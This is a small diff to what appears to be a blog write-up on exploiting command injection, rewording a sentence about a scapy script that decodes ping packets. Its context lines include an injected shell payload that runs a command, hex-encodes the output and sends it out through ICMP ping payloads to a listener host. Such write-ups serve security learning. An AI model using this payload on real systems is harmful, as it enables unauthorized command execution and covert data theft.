@@ -71,7 +71,7 @@ The below command will stop the first command, execute a command of our choosing
 ;PAYLOADS=$(ls -l 2>&1 | xxd -c 16 -ps); for PAYLOAD in $PAYLOADS; do ping -c 1 -p $PAYLOAD 192.168.2.103; done
 {% endhighlight %}
 Initially I was thinking of decoding the ping packets using a shell script with tshark but settled with scapy.
-I hacked together the following script which will capture only ping packets then decode and print the packets payload.
+I hacked together the following script which will capture the ping packets, decode them and print the command injected command's output.
 {% highlight python %}
 #!/usr/bin/env python2
 from scapy.all import *
